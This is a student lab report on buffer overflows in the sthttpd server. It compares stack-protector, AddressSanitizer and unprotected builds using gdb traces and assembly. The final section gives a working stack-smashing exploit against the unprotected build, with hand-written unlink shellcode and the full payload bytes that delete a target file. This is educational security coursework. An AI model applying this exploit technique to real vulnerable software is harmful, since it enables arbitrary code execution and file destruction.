Terrence Ho
804793446

2) 
Copy folder to Linux server
scp -r ~/Downloads/sthttpd-2.27.0 chuen@lnxsrv09.seas.ucla.edu:~ 

Make patch changes with vim

Use commands to build three different buggy executables
./configure \
LDFLAGS="-Xlinker --rpath=/usr/local/cs/gcc-$(gcc -dumpversion)/lib"

make clean
make CFLAGS='-g3 -O2 -fno-inline -fstack-protector-strong'
mv src/thttpd src/thttpd-sp

make clean
make CFLAGS='-g3 -O2 -fno-inline -static-libasan -fsanitize=address'
mv src/thttpd src/thttpd-as

make clean
make CFLAGS='-g3 -O2 -fno-inline -fno-stack-protector -zexecstack'
mv src/thttpd src/thttpd-no

3 + 4)
These commands were used to test the server with my ports, which were determined
with the previously given function.

src/thttpd-sp -p 12604 -D
curl http://localhost:12604/foo.txt

src/thttpd-as -p 12605 -D         
curl http://localhost:12605/foo.txt

src/thttpd-no -p 12606 -D
curl http://localhost:12606/foo.txt


config file: "port=qqq...." There are 500 qs in total.  Used Python shell to
write to file. Named config.txt


5)
gdb src/thttpd-sp 
(gdb) r -p 12604 -D -C config.txt
(gdb) bt

 0x00007ffff6db3118 in ?? () from /lib64/libgcc_s.so.1
 #0  0x00007ffff6db3118 in ?? () from /lib64/libgcc_s.so.1
 #1  0x00007ffff6db4019 in _Unwind_Backtrace () from /lib64/libgcc_s.so.1
 #2  0x00007ffff76e8636 in backtrace () from /lib64/libc.so.6
 #3  0x00007ffff7651f24 in __libc_message () from /lib64/libc.so.6
 #4  0x00007ffff76ec047 in __fortify_fail () from /lib64/libc.so.6
 #5  0x00007ffff76ec010 in __stack_chk_fail () from /lib64/libc.so.6
 #6  0x0000000000405056 in read_config (filename=<optimized out>) at thttpd.c:1190
 #7  0x7171717171717171 in ?? ()
 #8  0x7171717171717171 in ?? ()
 #9  0x7171717171717171 in ?? ()
 #10 0x7171717171717171 in ?? ()
 #11 0x7171717171717171 in ?? ()
 #12 0x7171717171717171 in ?? ()
 #13 0x7171717171717171 in ?? ()
 #14 0x7171717171717171 in ?? ()
 #15 0x7171717171717171 in ?? ()
 #16 0x7171717171717171 in ?? ()
 #17 0x7171717171717171 in ?? ()
 #18 0x7171717171717171 in ?? ()
 #19 0x7171717171717171 in ?? ()
 #20 0x7171717171717171 in ?? ()
 #21 0x7171717171717171 in ?? ()
 #22 0x7171717171717171 in ?? ()
 #23 0x7171717171717171 in ?? ()
 #24 0x7171717171717171 in ?? ()
 #25 0x7171717171717171 in ?? ()
 #26 0x7171717171717171 in ?? ()
 #27 0x7171717171717171 in ?? ()
 #28 0x7171717171717171 in ?? ()
 #29 0x7171717171717171 in ?? ()
 #30 0x7171717171717171 in ?? ()
 #31 0x7171717171717171 in ?? ()
 #32 0x7171717171717171 in ?? ()
 #33 0x7171717171717171 in ?? ()
 #34 0x7171717171717171 in ?? ()
 #35 0x7171717171717171 in ?? ()
 #36 0x7171717171717171 in ?? ()
 #37 0x7171717171717171 in ?? ()
 #38 0x7171717171717171 in ?? ()
 #39 0x7171717171717171 in ?? ()
 #40 0x7171717171717171 in ?? ()
 #41 0x7171717171717171 in ?? ()
 #42 0x7171717171717171 in ?? ()
 #43 0x7171717171717171 in ?? ()
 #44 0x7171717171717171 in ?? ()
 #45 0x7171717171717171 in ?? ()
 #46 0x7171717171717171 in ?? ()
 #47 0x7171717171717171 in ?? ()
 #48 0x7171717171717171 in ?? ()
 #49 0x7171717171717171 in ?? ()
 #50 0x7171717171717171 in ?? ()
 #51 0x0000000000000071 in ?? ()
 #52 0x0000000000000000 in ?? ()

The above is the trace I obtained with gdb, and it indicates we have hit a
segmentation fault at line 1190 of thttpd.c, which corresponds to the
read_config function.  Therefore, we should set a breakpoint before that line to
see what happened before the crash. The ?? () signifies that the address was
overwritten and the program could not fine it, which was overwritten when a
buffer overflow occured.  

gdb src/thttpd-sp 
(gdb) break 1189
(gdb) set disassemble-next-line on
(gdb) set logging on
(gdb) r -p 12604 -D -C config.txt
I used si (and ni to skip over functions) in order to obtain the following gdb log.

Breakpoint 1, read_config (filename=<optimized out>) at thttpd.c:1189
1189        (void) fclose( fp );
=> 0x0000000000404f1b <read_config+1211>:   4c 89 e7    mov    %r12,%rdi
 0x0000000000404f1e <read_config+1214>:   e8 1d d5 ff ff  callq  0x402440 <fclose@plt>
0x0000000000404f1e  1189        (void) fclose( fp );
 0x0000000000404f1b <read_config+1211>:   4c 89 e7    mov    %r12,%rdi
=> 0x0000000000404f1e <read_config+1214>:   e8 1d d5 ff ff  callq  0x402440 <fclose@plt>
1190        }
=> 0x0000000000404f23 <read_config+1219>:   48 8b 44 24 68  mov    0x68(%rsp),%rax
 0x0000000000404f28 <read_config+1224>:   64 48 33 04 25 28 00 00 00  xor    %fs:0x28,%rax
 0x0000000000404f31 <read_config+1233>:   0f 85 1a 01 00 00   jne    0x405051 <read_config+1521>
 0x0000000000404f37 <read_config+1239>:   48 83 c4 70 add    $0x70,%rsp
 0x0000000000404f3b <read_config+1243>:   5b  pop    %rbx
 0x0000000000404f3c <read_config+1244>:   5d  pop    %rbp
 0x0000000000404f3d <read_config+1245>:   41 5c   pop    %r12
 0x0000000000404f3f <read_config+1247>:   41 5d   pop    %r13
 0x0000000000404f41 <read_config+1249>:   41 5e   pop    %r14
 0x0000000000404f43 <read_config+1251>:   c3  retq
0x0000000000404f28  1190        }
 0x0000000000404f23 <read_config+1219>:   48 8b 44 24 68  mov    0x68(%rsp),%rax
=> 0x0000000000404f28 <read_config+1224>:   64 48 33 04 25 28 00 00 00  xor    %fs:0x28,%rax
 0x0000000000404f31 <read_config+1233>:   0f 85 1a 01 00 00   jne    0x405051 <read_config+1521>
 0x0000000000404f37 <read_config+1239>:   48 83 c4 70 add    $0x70,%rsp
 0x0000000000404f3b <read_config+1243>:   5b  pop    %rbx
 0x0000000000404f3c <read_config+1244>:   5d  pop    %rbp
 0x0000000000404f3d <read_config+1245>:   41 5c   pop    %r12
 0x0000000000404f3f <read_config+1247>:   41 5d   pop    %r13
 0x0000000000404f41 <read_config+1249>:   41 5e   pop    %r14
 0x0000000000404f43 <read_config+1251>:   c3  retq
0x0000000000404f31  1190        }
 0x0000000000404f23 <read_config+1219>:   48 8b 44 24 68  mov    0x68(%rsp),%rax
 0x0000000000404f28 <read_config+1224>:   64 48 33 04 25 28 00 00 00  xor    %fs:0x28,%rax
=> 0x0000000000404f31 <read_config+1233>:   0f 85 1a 01 00 00   jne    0x405051 <read_config+1521>
 0x0000000000404f37 <read_config+1239>:   48 83 c4 70 add    $0x70,%rsp
 0x0000000000404f3b <read_config+1243>:   5b  pop    %rbx
 0x0000000000404f3c <read_config+1244>:   5d  pop    %rbp
 0x0000000000404f3d <read_config+1245>:   41 5c   pop    %r12
 0x0000000000404f3f <read_config+1247>:   41 5d   pop    %r13
 0x0000000000404f41 <read_config+1249>:   41 5e   pop    %r14
 0x0000000000404f43 <read_config+1251>:   c3  retq
1190        }
=> 0x0000000000405051 <read_config+1521>:   e8 5a d4 ff ff  callq  0x4024b0 <__stack_chk_fail@plt>

I made this program crash with a config file who's string was too large to handle.
Stack protection places a canary onto the stack just before the function return
address was pushed on.  When a buffer overflow happens, it the canary will have
been changed, and thus causes a crash.  The xor call above compares the canary
to what the value should have been.  If it is different, the jne command is
called and the __stack_chk_fail@plt function is called and the program aborts.
Because the string from the config file was too long, it overrode the canary
protection and so next time the canary was checked, it failed the check and a
segmentation fault happened.


6)
gdb src/thttpd-as
(gdb) r -p 12605 -D -C config.txt
Starting program: /w/home.11/cs/ugrad/chuen/sthttpd-2.27.0/src/thttpd-as -p
12605 -D -C config.txt
[Thread debugging using libthread_db enabled]
Using host libthread_db library "/lib64/libthread_db.so.1".
=================================================================
==38857==ERROR: AddressSanitizer: stack-buffer-overflow on address
0x7fffffffcdc4 at pc 0x00000043aec9 bp 0x7fffffffcd20 sp 0x7fffffffc4d0
READ of size 506 at 0x7fffffffcdc4 thread T0

Program received signal SIGSEGV, Segmentation fault.
0x00007ffff7075118 in ?? () from /lib64/libgcc_s.so.1

(gdb) backtrace

#0  0x00007ffff7075118 in ?? () from /lib64/libgcc_s.so.1
[16/3375]
#1  0x00007ffff7076019 in _Unwind_Backtrace () from /lib64/libgcc_s.so.1
#2  0x00000000004b8ae3 in __sanitizer::BufferedStackTrace::SlowUnwindStack
(this=0x7fffffffbc40,
pc=4435657, max_depth=<optimized out>)
at
../../../../gcc-6.3.0/libsanitizer/sanitizer_common/sanitizer_unwind_linux_libcdep.cc:113
#3  0x00000000004b42e1 in __asan::GetStackTraceWithPcBpAndContext
(fast=false, context=0x0,
bp=140737488342304, pc=4435657, max_depth=256, stack=0x7fffffffbc40)
at ../../../../gcc-6.3.0/libsanitizer/asan/asan_stack.h:49
#4  __asan::ReportGenericError (pc=<optimized out>,
bp=bp@entry=140737488342304,
sp=sp@entry=140737488340176,
addr=addr@entry=140737488342468,
is_write=is_write@entry=false,
access_size=access_size@entry=506, exp=<optimized out>,
fatal=<optimized out>)
at
../../../../gcc-6.3.0/libsanitizer/asan/asan_report.cc:1092
#5  0x000000000043aee4 in __interceptor_strchr
(str=<optimized out>, c=<optimized out>)
at
../../../../gcc-6.3.0/libsanitizer/asan/asan_interceptors.cc:468
#6  0x00000000004e0b51 in read_config
(filename=<optimized out>) at thttpd.c:1018
#7  0x7171717171717171 in ?? ()
#8  0x7171717171717171 in ?? ()
#9  0x7171717171717171 in ?? ()
#10 0x7171717171717171 in ?? ()
#11 0x7171717171717171 in ?? ()
#12 0x7171717171717171 in ?? ()
#13 0x7171717171717171 in ?? ()
#14 0x7171717171717171 in ?? ()
#15 0x7171717171717171 in ?? ()
#16 0x7171717171717171 in ?? ()
#17 0x7171717171717171 in ?? ()
#18 0x7171717171717171 in ?? ()
#19 0x7171717171717171 in ?? ()
#20 0x7171717171717171 in ?? ()
#21 0x7171717171717171 in ?? ()
#22 0x7171717171717171 in ?? ()
#23 0x7171717171717171 in ?? ()
#24 0x7171717171717171 in ?? ()
#25 0x7171717171717171 in ?? ()
#26 0x7171717171717171 in ?? ()
#27 0x7171717171717171 in ?? ()
#28 0x7171717171717171 in ?? ()
#29 0x7171717171717171 in ?? ()
#30 0x7171717171717171 in ?? ()
#31 0x7171717171717171 in ?? ()
#32 0x7171717171717171 in ?? ()
#33 0x7171717171717171 in ?? ()
#34 0x7171717171717171 in ?? ()
#35 0x7171717171717171 in ?? ()
#36 0x7171717171717171 in ?? ()
#37 0x7171717171717171 in ?? ()
#38 0x7171717171717171 in ?? ()
#39 0x7171717171717171 in ?? ()
#40 0x7171717171717171 in ?? ()
#41 0x7171717171717171 in ?? ()
#42 0x7171717171717171 in ?? ()
#43 0x0000000000000071 in ?? ()
#44 0x0000000000504112 in ?? ()
#45 0x00000000004c12f0 in __sanitizer::MmapOrDie
(size=<optimized out>,)
mem_type=0x7171717171717171 <error: Cannot access memory at address
0x7171717171717171>)
at
../../../../gcc-6.3.0/libsanitizer/sanitizer_common/sanitizer_posix.cc:121
#46 0x00000000004beeaa in
__sanitizer::StackDepotBase<__sanitizer::StackDepotNode, 1, 20>::Put (
this=0x967e80 <__sanitizer::theDepot>, args=..., inserted=0x0)
at
../../../../gcc-6.3.0/libsanitizer/sanitizer_common/sanitizer_stackdepotbase.h:105
#47 0x00007fffffffe0d0 in ?? ()
#48 0x0000000000746f80 in ?? ()
#49 0x0000000000419eac in
__sanitizer::GenericScopedLock<__sanitizer::BlockingMutex>::~GenericScopedLock
(this=<synthetic pointer>, __in_chrg=<optimized out>)
at
../../../../gcc-6.3.0/libsanitizer/sanitizer_common/sanitizer_mutex.h:181
#50 __asan_register_globals (globals=<optimized out>,
n=7630720)
at
../../../../gcc-6.3.0/libsanitizer/asan/asan_globals.cc:220
#51 0x00000000004f5ecd in __libc_csu_init ()
#52 0x00007ffff6cc6b35 in __libc_start_main () from
/lib64/libc.so.6
#53 0x00000000004093fa in _start ()

We can see that the buffer overrun happens at line 1018 at thttpd.c, in the
read_config function.

gdb src/thttpd-as
(gdb) break 1017
(gdb) r -p 12605 -D -C config.txt
(gdb) set disassemble-next-line on
(gdb) si
0x00000000004e0b47      1018            if ( ( cp = strchr( line, '#' ) ) != (char*) 0 )
   0x00000000004e0b43 <read_config+179>:        48 8b 3c 24     mov    (%rsp),%rdi
=> 0x00000000004e0b47 <read_config+183>:        be 23 00 00 00  mov    $0x23,%esi
   0x00000000004e0b4c <read_config+188>:
    e8 2f a5 f5 ff      callq  0x43b080 <__interceptor_strchr(char const*, int)>
   0x00000000004e0b51 <read_config+193>:        48 85 c0        test   %rax,%rax
   0x00000000004e0b54 <read_config+196>:        74 24   je     0x4e0b7a <read_config+234>
(gdb) si
0x00000000004e0b4c      1018            if ( ( cp = strchr( line, '#' ) ) != (char*) 0 )
   0x00000000004e0b43 <read_config+179>:        48 8b 3c 24     mov    (%rsp),%rdi
   0x00000000004e0b47 <read_config+183>:        be 23 00 00 00  mov    $0x23,%esi
=> 0x00000000004e0b4c <read_config+188>:        e8 2f a5 f5 ff  callq  0x43b080 <__interceptor_strchr(char const*, int)>
   0x00000000004e0b51 <read_config+193>:        48 85 c0        test   %rax,%rax
   0x00000000004e0b54 <read_config+196>:        74 24   je     0x4e0b7a <read_config+234>

I made this program crash with a config file who's string was too large to handle.
Addreess Sanitation places checks on shadow memory, which stores metadata about
each piece of memory.  It can determine from this shadow memory if certain
pieces of memory are safe to access, and it "poisons" other memory zones if they
are not safe to be accessed.  If this poisoned memory has been accessed, then
address sanitation calls the __interceptor_strchr function and aborts the
program.  Because our string from the config file was too long, it was placed
into a piece of memory that was considered poisoned, and so when it was accessed

7) 
gdb src/thttpd-no
(gdb) r -P 12606 -D -C config.txt

Starting program: /w/home.11/cs/ugrad/chuen/sthttpd-2.27.0/src/thttpd-no -p
12606 -D -C config.txt
[Thread debugging using libthread_db enabled]
Using host libthread_db library "/lib64/libthread_db.so.1".

Program received signal SIGSEGV, Segmentation fault.
0x0000000000404d9f in read_config (filename=<optimized out>) at thttpd.c:1190
1190        }

It seems as though the program failed at line 1190 thttpd.c, so we will set a
breakpoint there.

gdb src/thttpd-no
(gdb) break 1189
(gdb) r -p 12606 -D -C config.txt
(gdb) set disassemble-next-line on
(gdb) si

Breakpoint 1, read_config (filename=<optimized out>) at thttpd.c:1189
1189        (void) fclose( fp );
=> 0x0000000000404d8b <read_config+1195>:       4c 89 e7        mov    %r12,%rdi
   0x0000000000404d8e <read_config+1198>:       e8 4d d6 ff ff  callq  0x4023e0 <fclose@plt>
(gdb) si
0x0000000000404d8e      1189        (void) fclose( fp );
   0x0000000000404d8b <read_config+1195>:       4c 89 e7        mov    %r12,%rdi
=> 0x0000000000404d8e <read_config+1198>:       e8 4d d6 ff ff  callq  0x4023e0 <fclose@plt>
(gdb) ni
1190        }
=> 0x0000000000404d93 <read_config+1203>:       48 83 c4 70     add    $0x70,%rsp
   0x0000000000404d97 <read_config+1207>:       5b      pop    %rbx
   0x0000000000404d98 <read_config+1208>:       5d      pop    %rbp
   0x0000000000404d99 <read_config+1209>:       41 5c   pop    %r12
   0x0000000000404d9b <read_config+1211>:       41 5d   pop    %r13
   0x0000000000404d9d <read_config+1213>:       41 5e   pop    %r14
   0x0000000000404d9f <read_config+1215>:       c3      retq
(gdb) si
0x0000000000404d97      1190        }
   0x0000000000404d93 <read_config+1203>:       48 83 c4 70     add    $0x70,%rsp
=> 0x0000000000404d97 <read_config+1207>:       5b      pop    %rbx
   0x0000000000404d98 <read_config+1208>:       5d      pop    %rbp
   0x0000000000404d99 <read_config+1209>:       41 5c   pop    %r12
   0x0000000000404d9b <read_config+1211>:       41 5d   pop    %r13
   0x0000000000404d9d <read_config+1213>:       41 5e   pop    %r14
   0x0000000000404d9f <read_config+1215>:       c3      retq
(gdb) si
0x0000000000404d98      1190        }
   0x0000000000404d93 <read_config+1203>:       48 83 c4 70     add    $0x70,%rsp
   0x0000000000404d97 <read_config+1207>:       5b      pop    %rbx
=> 0x0000000000404d98 <read_config+1208>:       5d      pop    %rbp
   0x0000000000404d99 <read_config+1209>:       41 5c   pop    %r12
   0x0000000000404d9b <read_config+1211>:       41 5d   pop    %r13
   0x0000000000404d9d <read_config+1213>:       41 5e   pop    %r14
   0x0000000000404d9f <read_config+1215>:       c3      retq
(gdb) si
0x0000000000404d99      1190        }
   0x0000000000404d93 <read_config+1203>:       48 83 c4 70     add    $0x70,%rsp
   0x0000000000404d97 <read_config+1207>:       5b      pop    %rbx
   0x0000000000404d98 <read_config+1208>:       5d      pop    %rbp
=> 0x0000000000404d99 <read_config+1209>:       41 5c   pop    %r12
   0x0000000000404d9b <read_config+1211>:       41 5d   pop    %r13
   0x0000000000404d9d <read_config+1213>:       41 5e   pop    %r14
   0x0000000000404d9f <read_config+1215>:       c3      retq
(gdb) si
0x0000000000404d9b      1190        }
   0x0000000000404d93 <read_config+1203>:       48 83 c4 70     add    $0x70,%rsp
   0x0000000000404d97 <read_config+1207>:       5b      pop    %rbx
   0x0000000000404d98 <read_config+1208>:       5d      pop    %rbp
   0x0000000000404d99 <read_config+1209>:       41 5c   pop    %r12
=> 0x0000000000404d9b <read_config+1211>:       41 5d   pop    %r13
   0x0000000000404d9d <read_config+1213>:       41 5e   pop    %r14
   0x0000000000404d9f <read_config+1215>:       c3      retq
(gdb) si
0x0000000000404d9d      1190        }
   0x0000000000404d93 <read_config+1203>:       48 83 c4 70     add    $0x70,%rsp
   0x0000000000404d97 <read_config+1207>:       5b      pop    %rbx
   0x0000000000404d98 <read_config+1208>:       5d      pop    %rbp
   0x0000000000404d99 <read_config+1209>:       41 5c   pop    %r12
   0x0000000000404d9b <read_config+1211>:       41 5d   pop    %r13
=> 0x0000000000404d9d <read_config+1213>:       41 5e   pop    %r14
   0x0000000000404d9f <read_config+1215>:       c3      retq
(gdb) si
0x0000000000404d9f      1190        }
   0x0000000000404d93 <read_config+1203>:       48 83 c4 70     add    $0x70,%rsp
   0x0000000000404d97 <read_config+1207>:       5b      pop    %rbx
   0x0000000000404d98 <read_config+1208>:       5d      pop    %rbp
   0x0000000000404d99 <read_config+1209>:       41 5c   pop    %r12
   0x0000000000404d9b <read_config+1211>:       41 5d   pop    %r13
   0x0000000000404d9d <read_config+1213>:       41 5e   pop    %r14
=> 0x0000000000404d9f <read_config+1215>:       c3      retq
(gdb) si

Program received signal SIGSEGV, Segmentation fault.
0x0000000000404d9f in read_config (filename=<optimized out>) at thttpd.c:1190
1190        }
   0x0000000000404d93 <read_config+1203>:       48 83 c4 70     add    $0x70,%rsp
   0x0000000000404d97 <read_config+1207>:       5b      pop    %rbx
   0x0000000000404d98 <read_config+1208>:       5d      pop    %rbp
   0x0000000000404d99 <read_config+1209>:       41 5c   pop    %r12
   0x0000000000404d9b <read_config+1211>:       41 5d   pop    %r13
   0x0000000000404d9d <read_config+1213>:       41 5e   pop    %r14
=> 0x0000000000404d9f <read_config+1215>:       c3      retq
(gdb) si

Program terminated with signal SIGSEGV, Segmentation fault.
The program no longer exists.

I made this program crash with a config file who's string was too large to handle.
There were no checks on the stack or within the memory to prevent this program
from reaching the return statement in the read_config function.  As such,
because the string was too long, it overrode the return address and tried to
execute some code that was not executable. As such, the program crashed with a
Segmentation fault.

8)

make clean
make CFLAGS='-S -O2 -fno-inline -fstack-protector-strong'
mv src/thttpd.o src/thttpd-sp.s

make clean
make CFLAGS='-S -O2 -fno-inline -static-libasan -fsanitize=address'
mv src/thttpd.o src/thttpd-as.s

make clean
make CFLAGS='-S -O2 -fno-inline -fno-stack-protector -zexecstack'
mv src/thttpd.o src/thttpd-no.s

These are the commands I used to make the assembly files

thttpd-sp.s has arounc 4.4k lines.  thttpd-sp works by placing "canaries" on
both sides of the buffer and will call a function to check whether this buffer
has been broken.  If it was broken (in our case by a string that was too long), 
it will output an error.  However, this check occurs outside the function
handle_read but rather in the read_config function at the very end when it calls
__stack_chk_fail().   Because of this, handle_read was not affected by stack
protection. This prevents buffer over-flow exploits by preventing the
return statement from executing arbitrary code that came about because the
string was too long.  

thttpd-as.s has around 9.6k lines, which is more than double of thttpd-sp.s.
thttpd-as version of handle_read is much larger than thttpd.sp, which suggests
that thttpd-as does many more checks to ensure memory does not overflow. After
each memory access, it has to check with the shadow memory to determine if the
memory is safe to access, which explains the large amount of machine code that
was generated. If shadow memory has been poisoned it will 
call the function __asan_report_loadn or __asan_report_storen, which puts out 
the error that a stack overflow has occured.  Address sanitation will cover more
memory checks, as it checks it much more often rather than at the end of a
function.  Address sanitation prevents buffer overrun exploits by checking if an
instruction was memory safe, and if was not kill the program, so there is
absolutely no chance of malicious code being executed that was injected with the
string that was too long.  

thttpd-no.s also has around 4.4k lines, which suggests it is not much different
from thttpd-sp.  In fact, the handle_read functions for both are exactly the
same.  There are no memory checks to speak of, and so only crashes when it
reaches a return address from which it cannot execute code.  The following
exploit relies on the fact it will reach the return statement and attempt to
execute whatever is in that code.  When the return statement cannot be executed,
it will crash.

9)
Exploit!!!

gdb src/thttpd-no
(gdb) break read_config
(gdb) r -p 12606 -D -C config.txt
Breakpoint 1, read_config (filename=0x7fffffffe4f2 "config.txt") at
thttpd.c:1000
1000        {
(gdb) p &line
$1 = (char (*)[100]) 0x7fffffffcec0
(gdb) info r
rax            0x5      5
rbx            0x7fffffffe4ef   140737488348399
rcx            0x0      0
rdx            0x2      2
rsi            0x7fffffffe4f2   140737488348402
rdi            0x7fffffffe4f2   140737488348402
rbp            0x5      0x5
rsp            0x7fffffffcf58   0x7fffffffcf58
r8             0x0      0
r9             0xd      13
r10            0xfffffffffffff4fd       -2819
r11            0x7ffff7710570   140737344767344
r12            0x40ec66 4254822
r13            0x6      6
r14            0x7fffffffe1f8   140737488347640
r15            0x5      5
rip            0x4048e0 0x4048e0 <read_config>
eflags         0x202    [ IF ]
cs             0x33     51
ss             0x2b     43
ds             0x0      0
es             0x0      0
fs             0x0      0
gs             0x0      0

Here we have found two important things:  The address of line, where text from
the config file goes into to, and the return address of rsp, since this is the
very beginning of the function
&line = 0x7fffffffcec0
%rsp = 0x7fffffffcf58
diff = 0x7fffffffcec0 - 0x7fffffffcf58 = 152

Next I created a simple file in c to obtain the hex code for "target.txt"
test.c:
int main(){
    char s[11] = "target.txt";
    return 0;
}
By viewing the file in assembly, we can determine the hex code for "target.txt"
is 7461 7267 6574 2e74 7874 0a.  Target.txt is 11 bytes long, and we will want
the byte code we just generated to be a target for the c function unlink

(gdb) disas /r unlink
Dump of assembler code for function unlink:
   0x00007ffff76c7330 <+0>:     b8 57 00 00 00  mov    $0x57,%eax
   0x00007ffff76c7335 <+5>:     0f 05   syscall
   0x00007ffff76c7337 <+7>:     48 3d 01 f0 ff ff       cmp    $0xfffffffffffff001,%rax
   0x00007ffff76c733d <+13>:    73 01   jae    0x7ffff76c7340 <unlink+16>
   0x00007ffff76c733f <+15>:    c3      retq
   0x00007ffff76c7340 <+16>:    48 8b 0d 21 fb 2c 00    mov    0x2cfb21(%rip),%rcx        # 0x7ffff7996e68
   0x00007ffff76c7347 <+23>:    f7 d8   neg    %eax
   0x00007ffff76c7349 <+25>:    64 89 01        mov    %eax,%fs:(%rcx)
   0x00007ffff76c734c <+28>:    48 83 c8 ff     or     $0xffffffffffffffff,%rax
   0x00007ffff76c7350 <+32>:    c3      retq
End of assembler dump.

The function places 87 into rax, and then calls the syscall function
Now that we know how unlink works in machine code, we can write some assembly code ourselves
so we can see the byte code needed to move the string "target.txt" into unlink
for it to be deleted.  I write a file called move.s myself. 7fffffffcf48 comes from 
the return address 7fffffffcf58 - 11 (number of bytes from "target.txt") - 5. 

move.s:
movq    $0x7fffffffcf48, %rdi
movq    $0x57, %rax
syscall

Compile it and disassemble it with the following
gcc -c move.s
objdump -d move.o

move.o disassembled:
 0:   48 bf 48 cf ff ff ff    movabs $0x7fffffffcf48,%rdi
 7:   7f 00 00
 a:   48 c7 c0 57 00 00 00    mov    $0x57,%rax
11:   0f 05

We have just generated the byte code that will delete the file.
48 bf 48 cf ff ff ff 7f 00 00 48 c7 c0 57 00 00 00 0f 05

We have 152 bytes to work with from the beginning of &line, which means we
really are dealing with 160 bytes.  At the beginning of our hex code, we will
put the code to delete the target.txt., and at the end, we will put the name of
the text file, target.txt, which will be fed into unlink.  

00 00 00 48 bf 48 cf ff ff ff 7f 00 00 48 c7 c0 57 
00 00 00 0f 05 00 00 00 00 00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00 00 00 00 00 74 61 72 67 65 
74 2e 74 78 74 00 00 00 00 00 00 c8 ce ff ff ff 7f 00 00

The code above is the byte code in ascii before being shifted to transformed to
hex.  It starts with the unlink code, has some zeroes for spacing, then has the
byte code for target.txt, and finally at the end we have the byte code for the
address of the line, which when run the return address will execute the address
for the variable line, go there and run the code for unlink, which will execute
on the encoded "target.txt" string.  Thus the file will be deleted.

There are 111 zero bytes in between to make it 155 bytes.  We reserve 5 bytes
for "port=", which the config file requires.  We transform the above from hex
code to ascii code, then add on "port=", which is what the spec for a congif
file requires.

Now we crash the src/thttpd-no and delete the target.txt file

gdb src/thttpd-no.  raw.txt contains "port=hex..."
(gdb) r -p 12606 -D -C raw.txt
Starting program: /w/home.11/cs/ugrad/chuen/sthttpd-2.27.0/src/thttpd-no -p
12606 -D -C raw.txt
[Thread debugging using libthread_db enabled]
Using host libthread_db library "/lib64/libthread_db.so.1".

Program received signal SIGSEGV, Segmentation fault.
0x00007fffffffcedb in ?? ()

Afterwards, we can check that the target.txt file has been deleted, which
completes this exploit. 
